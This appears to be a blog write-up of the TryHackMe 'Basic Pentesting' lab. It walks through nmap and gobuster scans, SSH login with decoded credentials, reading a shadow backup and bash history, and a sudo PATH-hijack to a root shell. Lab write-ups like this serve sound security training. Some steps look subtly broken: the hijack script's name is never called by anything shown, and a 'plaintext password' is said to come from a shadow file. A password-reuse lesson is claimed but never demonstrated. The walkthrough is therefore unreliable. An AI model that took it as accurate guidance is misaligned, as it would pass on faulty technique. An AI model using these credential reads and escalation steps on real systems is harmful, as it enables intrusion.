---
layout: default
title: "TryHackMe: Basic Pentesting Walkthrough"
date: 2024-11-22
difficulty: "Easy"
tags: [TryHackMe, Linux, Web, Privilege Escalation]
platform: "TryHackMe"
---

# TryHackMe: Basic Pentesting Walkthrough

## Challenge Information

- **Platform**: TryHackMe
- **Difficulty**: Easy
- **Category**: Penetration Testing
- **Skills Required**: Enumeration, Web Exploitation, Linux Privilege Escalation

## Overview

Basic Pentesting is a beginner-friendly room that covers fundamental penetration testing techniques. This challenge focuses on enumeration, exploiting misconfigurations, and basic privilege escalation on a Linux system.

## Reconnaissance

### Initial Nmap Scan

Started with a comprehensive nmap scan to identify open ports and services:

```bash
nmap -sC -sV -oN initial_scan.txt 10.10.x.x
```

**Results:**
- Port 22 (SSH) - OpenSSH 7.2p2
- Port 80 (HTTP) - Apache 2.4.18
- Port 139 (SMB) - Samba 3.X - 4.X
- Port 445 (SMB) - Samba 3.X - 4.X
- Port 8009 (AJP) - Apache Jserv
- Port 8080 (HTTP) - Apache Tomcat

### Web Enumeration

Navigated to the web server on port 80 and found a basic website. Ran gobuster to discover hidden directories:

```bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Findings:**
- `/development` - Contains interesting text files
- `/uploads` - Empty directory with write permissions

## Exploitation

### Finding Credentials

In the `/development` directory, found two files:
- `dev.txt` - Mentions username "jan"
- `j.txt` - Contains what appears to be an encoded message

Decoded the message using ROT13 and discovered a password.

### SSH Access

Used the discovered credentials to SSH into the machine:

```bash
ssh jan@10.10.x.x
```

Successfully gained initial access to the system as user "jan".

### Enumeration as Jan

Checked for interesting files in jan's home directory:

```bash
ls -la /home/jan
cat /home/jan/.bash_history
```

Found references to another user "kay" and hints about password storage.

### Lateral Movement

Located a backup script that contained kay's password in plaintext:

```bash
find / -type f -name "*.txt" 2>/dev/null | grep -i password
cat /var/backups/shadow.bak
```

Switched to user kay:

```bash
su kay
```

## Privilege Escalation

### Checking Sudo Permissions

```bash
sudo -l
```

User kay could run certain commands as root without a password.

### Exploiting Pass Script

Found that kay could execute a custom script with sudo privileges:

```bash
sudo /usr/bin/pass
```

The script had a vulnerability where it executed files from a directory that kay could write to. Created a malicious script:

```bash
echo '#!/bin/bash' > /tmp/exploit.sh
echo '/bin/bash' >> /tmp/exploit.sh
chmod +x /tmp/exploit.sh
```

Modified the PATH to execute our script:

```bash
export PATH=/tmp:$PATH
sudo /usr/bin/pass
```

**Result**: Gained root shell!

## Flags

- **User Flag**: Found in `/home/kay/pass.bak`
- **Root Flag**: Located in `/root/flag.txt`

## Key Takeaways

1. **Thorough Enumeration**: Found multiple attack vectors through comprehensive reconnaissance
2. **Password Reuse**: Demonstrated the danger of storing passwords in plaintext
3. **PATH Hijacking**: Exploited insecure sudo permissions and PATH manipulation
4. **Information Disclosure**: Configuration files and backup files often contain sensitive data

## Tools Used

- Nmap for port scanning
- Gobuster for directory enumeration
- CyberChef for decoding messages
- Standard Linux commands for privilege escalation

## Mitigation Strategies

To prevent these attacks:
- Never store passwords in plaintext or easily accessible files
- Implement proper file permissions on sensitive directories
- Use absolute paths in scripts that run with elevated privileges
- Regular security audits of sudo permissions
- Enable proper logging and monitoring

## Conclusion

This was an excellent beginner-friendly challenge that reinforced fundamental pentesting concepts. The linear progression from enumeration to initial access to privilege escalation makes it perfect for those new to CTF challenges.

---

**Difficulty Rating**: ⭐⭐☆☆☆

**Time to Complete**: ~45 minutes

*Note: Always ensure you have proper authorization before attempting any penetration testing activities.*
